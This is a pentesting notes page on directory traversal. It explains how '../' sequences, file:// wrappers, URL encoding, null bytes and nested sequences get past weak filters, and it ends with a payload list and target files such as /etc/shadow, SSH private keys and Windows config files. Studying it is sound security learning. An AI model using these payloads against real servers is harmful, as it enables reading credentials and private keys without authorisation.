---
description: ../
---

# Directory Traversal

Directory Traversal is a vulnerability that can be used to view files beyond the document root / webroot of the website.

{% hint style="info" %}
It should be noted that directory traversal can result in **either** an arbitrary file read OR local file inclusion (LFI).

The difference between the two is that **arbitrary read is only used to READ files and CANNOT execute scripts**. LFI on the other hand, **allows for execution**.

{% endhint %}

<figure><img src="../../.gitbook/assets/image (125).png" alt=""><figcaption><p><em>Taken from PortSwigger Web Security Academy</em></p></figcaption></figure>

## ../

In terminals of a Linux or Windows server, `..` means '1 level up', so `cd ..` means 'change directory to one level up'. Appending multiple of these strings together to go up multiple directories, like `cd ../../../` would go up 3 directories.

Each `../` represents an **action**. If a server fails to parse the filename properly, then one can key in `../../../etc/passwd` to escape the webroot folder, and then load `/etc/passwd`.

Additionally, it's important to note that local files on a system can be processed as a URL using the `file://` wrapper. Other wrappers exist, like `gopher://` and `php://` too, and depending on the application, can allow for reading of files.

```bash
http://example.com?url=http://google.com

# file:// wrapper
http://example.com?url=file://../../../../../../../etc/passwd
```

<figure><img src="../../.gitbook/assets/image (1694).png" alt=""><figcaption></figcaption></figure>

Naturally, this is dangerous since it gives attackers access to files that could have sensitive information (like SSH private keys).

## Bypassing WAFs

Some applications have WAFs to detect attempts to abuse directory traversal, which still can be bypassed via various encoding:

### URL-Encoding

One can recursively encoding a payload:

> URL-Encoding, otherwise known as Percent-Encoding, is a method to encode arbitrary data in a Uniform Resource Identifier (URI) using only the limited ASCII characters legal within a URI

By URL-encodng it, the WAF may fail to pick up on the payload in some cases. This works because most applications takes user input and URL-decodes it once to view what are the actions required. 

By encoding it twice or thrice, it is possible to bypass a weak WAF since it may only be checking for `../` characters. Once bypassed, the web application still understands the unencoded payload and processes it.

```bash
# not url-encoded
../../../../../etc/passwd

#url encoded
..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

### Null Byte

If there is a check on the **file extension** of files read, then one can truncate the rest of the query appending a **null byte**.

`%00` represents a single byte of data meaning NULL. This terminates the query and causes the extension portion to be left out from processing. However, it's still technically present as text for the WAF to process.

```bash
# .png still present, bypass WAF
../../../../etc/passwd%00.png
```

### Nested Sequences

Sometimes, a website could block `../` character sequences. In this case, one can use  `....//`, which is equals to `../../`.

### Downloading Files

Sometimes, we can access certain and download files and even binaries via directory traversal. We can check what's by looking into the /proc directory and install the files via curl and the -o flag. Retired from HTB is a machine that uses this, and we can download a binary that is vulnerbale to a ROP chaining vulnerability that would give us an initial shell.&#x20;

## Testing

Here are some common payloads that can be used to bypass basic WAFs, and world-readable files on Windows and Linux machines to test if the exploit works:

<pre class="language-bash"><code class="lang-bash"><strong># common payloads
</strong>../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
...\.\
<strong>
</strong><strong># for Linux
</strong>/etc/passwd
/etc/hosts
/etc/shadow # if we have privileges
/home/user/.ssh/id_rsa # if we need keys

# for Windows
C:/Users/Administrator/NTUser.dat
C:/Documents and Settings/Administrator/NTUser.dat
C:/boot.ini
C:/inetpub/wwwroot/global.asa
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache/logs/access.log
C:/Program Files/Apache Group/Apache/logs/error.log
C:/Program Files/FileZilla Server/FileZilla Server.xml
C:/Program Files/MySQL/data/hostname.err
</code></pre>
